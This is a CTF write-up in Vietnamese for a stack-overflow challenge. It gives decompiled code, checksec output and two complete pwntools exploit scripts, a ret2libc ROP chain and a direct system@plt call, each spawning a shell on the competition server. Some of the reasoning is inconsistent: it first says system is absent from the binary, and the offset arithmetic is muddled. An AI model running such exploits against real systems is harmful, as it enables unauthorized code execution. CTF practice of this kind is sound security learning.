# ida
```c
int date()
{
  return system("/bin/date");
}

__int64 vuln()
{
  char v1[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("Tell us some review about our program: ");
  fflush(_bss_start);
  return gets(v1);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  puts("Welcome to the feedback submiter.");
  vuln();
  return 0;
}
```
# checksec
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

#### thông qua ida và checksec, ta có thể đoán được là ret2libc
> hàm system bài này không có sẵn trong file, có trong file libc trên sever

# ret2libc
> do trong chương trình có hàm puts nên ta có put@got và put@plt dễ dành leak được libc và tính địa chỉ base.
```python
payload = b"a" * 72 + p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
r.sendlineafter(b"our program: ", payload)
leak_libc = u64(r.recvuntil(b"\nWelcome", drop=True)[1:]+b'\0\0')
log.info('leak libc: ' + hex(leak_libc))
```
chạy script trên sever ta nhận được ```leak libc: 0x7f1dec78aed0``` (ở đây 3kí tự cuối ```ed0``` là không đổi), tìm file libc trên mạng t có 1 file

tiếp đến ta pwninit nhưng... có vẻ như nó không tự động patched với nhau.
```
bin: ./exe

copying ./exe to ./exe_patched
running patchelf on ./exe_patched
```
nhưng không sao, ta sẽ tính tay.
___
Đầu tiên ta sẽ tính địa chỉ base libc 

![image](https://user-images.githubusercontent.com/111769169/223641357-b1530364-a813-4f70-a4be-a797fe7975bb.png)

ta sẽ lấy địa chỉ nhỏ nhất của libc là ```0x007ffff7d8d000``` base và tính offset từ địa chỉ leak đến địa
```python
libc.address = leak_libc - 528080
log.info('base libc: ' + hex(libc.address))
```
tiếp đó debug động, ta sẽ kiểm tra địa chỉ của chuỗi ```/bin/sh``` và hàm ```symtem``` là:

```
[*] /bin/sh: 0x7ff7752d1dd0
[*] base libc: 0x7ff775277f80
```
và tìm chuỗi /bin/sh ở địa chỉ ```0x7ff775401698 - 0x7ff77540169f  →   "/bin/sh"``` và hàm symtem ở ```$1 = (int (*)(const char *)) 0x7ff775279d60 <__libc_system>```
tính offset của chuỗi /bin/sh: 1243336 và system: 7648
kiểm tra lại ta thấy đúng rồi là oke

```
0x007ffdf36f7710│+0x0050: 0x00000000400703  →  <__libc_csu_init+99> pop rdi
0x007ffdf36f7718│+0x0058: 0x007feff7d40698  →  0x68732f6e69622f ("/bin/sh"?)
0x007ffdf36f7720│+0x0060: 0x007feff7bb8d60  →  <system+0> endbr64
```

do khi chạy ta có lỗi xmm1 nên ta sẽ gọi lệnh ret để +8 vào stack

<details> <summary> script </summary>

```python
from pwn import *

# r = process("./exe_patched")
r = remote("execution.ctf.pragyan.org" , 12386)
exe = ELF("./exe_patched")
libc = ELF("./musl_1.1.24-1_amd64.so")
# gdb.attach(r, gdbscript='''
#            b*vuln+50
#            c
#            ''')
input()

pop_rdi = 0x0000000000400703
#################
### leak libc ###
#################
payload = b"a" * 72 + p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])
r.sendlineafter(b"our program: ", payload)
leak_libc = u64(r.recvuntil(b"\nWelcome", drop=True)[1:]+b'\0\0')
libc.address = leak_libc - 528080
log.info('leak libc: ' + hex(leak_libc))
log.info('base libc: ' + hex(libc.address))

#####################
### check address ###
#####################
log.info("/bin/sh: " + hex(next(libc.search(b"/bin/sh"))))
log.info('system: ' + hex(libc.sym['system']))


payload = b'a'*72
payload += p64(0x00000000004004c9)      #ret
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')) + 1243336)
payload += p64(libc.sym['system'] + 7648)
r.sendlineafter(b"our program: ", payload)
r.interactive()
```

</details>

# Cách 2  


# cách 2:
> do người ta có hàm system trong file rồi nên ta có thể nhảy vào hàm system lun

<details> <summary> script </summary> 

```python
context.binary = exe

pop_rdi = 0x0000000000400703

payload = b'A'*72
payload += flat(
    pop_rdi, 0x00000000601a00,      # pop_rdi và mình dùng hàm gets để ghi vào vùng nhớ được phép ghi 0x0060100 để lưu /bin/sh
    exe.plt['gets'],
    pop_rdi, 0x00000000601a00,      # pop_rdi và trỏ đến địa chỉ lưu /bin/sh và thực thi
    exe.plt['system'],
    )
r.sendlineafter(b"our program: ", payload)
r.sendline(b'/bin/sh\0')
```

</details>